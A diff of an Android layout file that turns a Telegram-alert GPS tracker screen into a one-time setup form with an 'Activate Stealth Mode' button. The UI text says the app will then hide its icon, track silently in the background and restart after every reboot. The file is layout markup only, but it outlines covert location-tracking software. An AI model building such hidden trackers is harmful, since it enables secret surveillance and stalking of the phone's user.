@@ -4,149 +4,53 @@
     android:layout_width="match_parent"
     android:layout_height="match_parent"
     android:fillViewport="true"
-    android:background="#121212">
+    android:background="#0D0D0D">
 
     <androidx.constraintlayout.widget.ConstraintLayout
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
         android:padding="24dp">
 
-        <!-- Title -->
+        <!-- Header -->
         <TextView
             android:id="@+id/tvTitle"
             android:layout_width="0dp"
             android:layout_height="wrap_content"
             android:text="GPS Tracker"
-            android:textSize="28sp"
+            android:textSize="26sp"
             android:textStyle="bold"
             android:textColor="#FFFFFF"
             android:gravity="center"
+            android:layout_marginTop="20dp"
             app:layout_constraintTop_toTopOf="parent"
             app:layout_constraintStart_toStartOf="parent"
-            app:layout_constraintEnd_toEndOf="parent"
-            android:layout_marginTop="16dp" />
+            app:layout_constraintEnd_toEndOf="parent" />
 
         <TextView
             android:id="@+id/tvSubtitle"
             android:layout_width="0dp"
             android:layout_height="wrap_content"
-            android:text="Sends Telegram alerts when you move more than 50 m"
-            android:textSize="13sp"
-            android:textColor="#AAAAAA"
+            android:text="One-time setup"
+            android:textSize="12sp"
+            android:textColor="#888888"
             android:gravity="center"
+            android:letterSpacing="0.15"
+            android:layout_marginTop="4dp"
             app:layout_constraintTop_toBottomOf="@id/tvTitle"
             app:layout_constraintStart_toStartOf="parent"
-            app:layout_constraintEnd_toEndOf="parent"
-            android:layout_marginTop="4dp" />
-
-        <!-- Divider -->
-        <View
-            android:id="@+id/divider1"
-            android:layout_width="0dp"
-            android:layout_height="1dp"
-            android:background="#333333"
-            android:layout_marginTop="24dp"
-            app:layout_constraintTop_toBottomOf="@id/tvSubtitle"
-            app:layout_constraintStart_toStartOf="parent"
             app:layout_constraintEnd_toEndOf="parent" />
 
-        <!-- Bot Token Label -->
-        <TextView
-            android:id="@+id/tvBotTokenLabel"
-            android:layout_width="0dp"
-            android:layout_height="wrap_content"
-            android:text="Telegram Bot Token"
-            android:textSize="12sp"
-            android:textColor="#AAAAAA"
-            android:letterSpacing="0.1"
-            android:layout_marginTop="24dp"
-            app:layout_constraintTop_toBottomOf="@id/divider1"
-            app:layout_constraintStart_toStartOf="parent"
-            app:layout_constraintEnd_toEndOf="parent" />
-
-        <com.google.android.material.textfield.TextInputLayout
-            android:id="@+id/tilBotToken"
-            style="@style/Widget.MaterialComponents.TextInputLayout.OutlinedBox"
-            android:layout_width="0dp"
-            android:layout_height="wrap_content"
-            android:layout_marginTop="6dp"
-            app:boxStrokeColor="#6200EE"
-            app:hintTextColor="#AAAAAA"
-            app:layout_constraintTop_toBottomOf="@id/tvBotTokenLabel"
-            app:layout_constraintStart_toStartOf="parent"
-            app:layout_constraintEnd_toEndOf="parent">
-
-            <com.google.android.material.textfield.TextInputEditText
-                android:id="@+id/etBotToken"
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:hint="123456:ABC-DEF..."
-                android:textColor="#FFFFFF"
-                android:textColorHint="#666666"
-                android:inputType="textVisiblePassword"
-                android:imeOptions="actionNext" />
-        </com.google.android.material.textfield.TextInputLayout>
-
-        <!-- Chat ID Label -->
-        <TextView
-            android:id="@+id/tvChatIdLabel"
-            android:layout_width="0dp"
-            android:layout_height="wrap_content"
-            android:text="Telegram Chat ID"
-            android:textSize="12sp"
-            android:textColor="#AAAAAA"
-            android:letterSpacing="0.1"
-            android:layout_marginTop="16dp"
-            app:layout_constraintTop_toBottomOf="@id/tilBotToken"
-            app:layout_constraintStart_toStartOf="parent"
-            app:layout_constraintEnd_toEndOf="parent" />
-
-        <com.google.android.material.textfield.TextInputLayout
-            android:id="@+id/tilChatId"
-            style="@style/Widget.MaterialComponents.TextInputLayout.OutlinedBox"
-            android:layout_width="0dp"
-            android:layout_height="wrap_content"
-            android:layout_marginTop="6dp"
-            app:boxStrokeColor="#6200EE"
-            app:hintTextColor="#AAAAAA"
-            app:layout_constraintTop_toBottomOf="@id/tvChatIdLabel"
-            app:layout_constraintStart_toStartOf="parent"
-            app:layout_constraintEnd_toEndOf="parent">
-
-            <com.google.android.material.textfield.TextInputEditText
-                android:id="@+id/etChatId"
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:hint="-100123456789"
-                android:textColor="#FFFFFF"
-                android:textColorHint="#666666"
-                android:inputType="numberSigned"
-                android:imeOptions="actionDone" />
-        </com.google.android.material.textfield.TextInputLayout>
-
-        <!-- Hint -->
-        <TextView
-            android:id="@+id/tvHint"
-            android:layout_width="0dp"
-            android:layout_height="wrap_content"
-            android:text="Tip: get your Chat ID by messaging @userinfobot on Telegram"
-            android:textSize="11sp"
-            android:textColor="#777777"
-            android:layout_marginTop="6dp"
-            app:layout_constraintTop_toBottomOf="@id/tilChatId"
-            app:layout_constraintStart_toStartOf="parent"
-            app:layout_constraintEnd_toEndOf="parent" />
-
-        <!-- Status Card -->
+        <!-- Stealth active card (shown after activation) -->
         <androidx.cardview.widget.CardView
-            android:id="@+id/cardStatus"
+            android:id="@+id/cardActive"
             android:layout_width="0dp"
             android:layout_height="wrap_content"
             android:layout_marginTop="24dp"
-            app:cardBackgroundColor="#1E1E1E"
-            app:cardCornerRadius="12dp"
+            android:visibility="gone"
+            app:cardBackgroundColor="#0A2A0A"
+            app:cardCornerRadius="14dp"
             app:cardElevation="0dp"
-            app:layout_constraintTop_toBottomOf="@id/tvHint"
+            app:layout_constraintTop_toBottomOf="@id/tvSubtitle"
             app:layout_constraintStart_toStartOf="parent"
             app:layout_constraintEnd_toEndOf="parent">
 
@@ -154,91 +58,152 @@
                 android:layout_width="match_parent"
                 android:layout_height="wrap_content"
                 android:orientation="vertical"
-                android:padding="16dp">
-
-                <LinearLayout
-                    android:layout_width="match_parent"
-                    android:layout_height="wrap_content"
-                    android:orientation="horizontal"
-                    android:gravity="center_vertical">
-
-                    <View
-                        android:id="@+id/statusDot"
-                        android:layout_width="10dp"
-                        android:layout_height="10dp"
-                        android:background="@drawable/circle_dot"
-                        android:backgroundTint="@color/red_inactive" />
-
-                    <TextView
-                        android:id="@+id/tvStatus"
-                        android:layout_width="wrap_content"
-                        android:layout_height="wrap_content"
-                        android:text="Tracking inactive"
-                        android:textColor="#FFFFFF"
-                        android:textSize="15sp"
-                        android:textStyle="bold"
-                        android:layout_marginStart="10dp" />
-                </LinearLayout>
+                android:padding="20dp"
+                android:gravity="center">
 
                 <TextView
-                    android:id="@+id/tvCurrentLocation"
-                    android:layout_width="match_parent"
+                    android:layout_width="wrap_content"
                     android:layout_height="wrap_content"
-                    android:text="No location fix yet"
-                    android:textColor="#AAAAAA"
-                    android:textSize="12sp"
+                    android:text="🔒"
+                    android:textSize="32sp" />
+
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="Stealth Mode Active"
+                    android:textColor="#4CAF50"
+                    android:textSize="17sp"
+                    android:textStyle="bold"
                     android:layout_marginTop="8dp" />
 
                 <TextView
-                    android:id="@+id/tvDistance"
-                    android:layout_width="match_parent"
+                    android:layout_width="wrap_content"
                     android:layout_height="wrap_content"
-                    android:text="Distance from start: —"
+                    android:text="This app will now disappear from your home screen and app drawer. Tracking runs silently in the background and restarts automatically after every reboot."
                     android:textColor="#AAAAAA"
-                    android:textSize="12sp"
-                    android:layout_marginTop="4dp" />
-
-                <TextView
-                    android:id="@+id/tvLastSent"
-                    android:layout_width="match_parent"
-                    android:layout_height="wrap_content"
-                    android:text="Last Telegram message: —"
-                    android:textColor="#AAAAAA"
-                    android:textSize="12sp"
-                    android:layout_marginTop="4dp" />
+                    android:textSize="13sp"
+                    android:gravity="center"
+                    android:layout_marginTop="8dp" />
 
             </LinearLayout>
         </androidx.cardview.widget.CardView>
 
-        <!-- Start / Stop Button -->
-        <com.google.android.material.button.MaterialButton
-            android:id="@+id/btnToggle"
+        <!-- Setup form (hidden after activation) -->
+        <LinearLayout
+            android:id="@+id/layoutSetup"
             android:layout_width="0dp"
-            android:layout_height="56dp"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
             android:layout_marginTop="24dp"
-            android:text="Start Tracking"
-            android:textSize="16sp"
-            android:textStyle="bold"
-            app:cornerRadius="12dp"
-            app:layout_constraintTop_toBottomOf="@id/cardStatus"
+            app:layout_constraintTop_toBottomOf="@id/tvSubtitle"
             app:layout_constraintStart_toStartOf="parent"
-            app:layout_constraintEnd_toEndOf="parent" />
+            app:layout_constraintEnd_toEndOf="parent">
 
-        <!-- Test Button -->
-        <com.google.android.material.button.MaterialButton
-            android:id="@+id/btnTest"
-            style="@style/Widget.MaterialComponents.Button.OutlinedButton"
-            android:layout_width="0dp"
-            android:layout_height="48dp"
-            android:layout_marginTop="12dp"
-            android:text="Send Test Message"
-            android:textSize="14sp"
-            app:cornerRadius="12dp"
-            app:layout_constraintTop_toBottomOf="@id/btnToggle"
-            app:layout_constraintStart_toStartOf="parent"
-            app:layout_constraintEnd_toEndOf="parent"
-            app:layout_constraintBottom_toBottomOf="parent"
-            android:layout_marginBottom="24dp" />
+            <!-- Bot Token -->
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="TELEGRAM BOT TOKEN"
+                android:textSize="11sp"
+                android:textColor="#888888"
+                android:letterSpacing="0.12" />
+
+            <com.google.android.material.textfield.TextInputLayout
+                android:id="@+id/tilBotToken"
+                style="@style/Widget.MaterialComponents.TextInputLayout.OutlinedBox"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:layout_marginTop="6dp"
+                app:boxStrokeColor="#444444"
+                app:boxStrokeColorStateList="@null">
+
+                <com.google.android.material.textfield.TextInputEditText
+                    android:id="@+id/etBotToken"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:hint="123456:ABC-DEF..."
+                    android:textColor="#FFFFFF"
+                    android:textColorHint="#555555"
+                    android:inputType="textVisiblePassword"
+                    android:imeOptions="actionNext"
+                    android:fontFamily="monospace"
+                    android:textSize="13sp" />
+            </com.google.android.material.textfield.TextInputLayout>
+
+            <!-- Chat ID -->
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="TELEGRAM CHAT ID"
+                android:textSize="11sp"
+                android:textColor="#888888"
+                android:letterSpacing="0.12"
+                android:layout_marginTop="16dp" />
+
+            <com.google.android.material.textfield.TextInputLayout
+                android:id="@+id/tilChatId"
+                style="@style/Widget.MaterialComponents.TextInputLayout.OutlinedBox"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:layout_marginTop="6dp"
+                app:boxStrokeColor="#444444"
+                app:boxStrokeColorStateList="@null">
+
+                <com.google.android.material.textfield.TextInputEditText
+                    android:id="@+id/etChatId"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:hint="-100123456789"
+                    android:textColor="#FFFFFF"
+                    android:textColorHint="#555555"
+                    android:inputType="numberSigned"
+                    android:imeOptions="actionDone"
+                    android:fontFamily="monospace"
+                    android:textSize="13sp" />
+            </com.google.android.material.textfield.TextInputLayout>
+
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="Get Chat ID: message @userinfobot on Telegram"
+                android:textSize="11sp"
+                android:textColor="#555555"
+                android:layout_marginTop="6dp" />
+
+            <!-- Test button -->
+            <com.google.android.material.button.MaterialButton
+                android:id="@+id/btnTest"
+                style="@style/Widget.MaterialComponents.Button.OutlinedButton"
+                android:layout_width="match_parent"
+                android:layout_height="48dp"
+                android:layout_marginTop="20dp"
+                android:text="Send Test Message"
+                android:textSize="14sp"
+                app:cornerRadius="10dp"
+                app:strokeColor="#444444" />
+
+            <!-- Activate stealth -->
+            <com.google.android.material.button.MaterialButton
+                android:id="@+id/btnActivate"
+                android:layout_width="match_parent"
+                android:layout_height="56dp"
+                android:layout_marginTop="12dp"
+                android:text="Activate Stealth Mode"
+                android:textSize="15sp"
+                android:textStyle="bold"
+                app:backgroundTint="#4CAF50"
+                app:cornerRadius="10dp" />
+
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="⚠ Once activated, the app icon will vanish. To access settings again: Settings → Apps → GPS Tracker → Open."
+                android:textSize="11sp"
+                android:textColor="#666666"
+                android:layout_marginTop="10dp"
+                android:layout_marginBottom="8dp" />
+
+        </LinearLayout>
 
     </androidx.constraintlayout.widget.ConstraintLayout>
 </ScrollView>
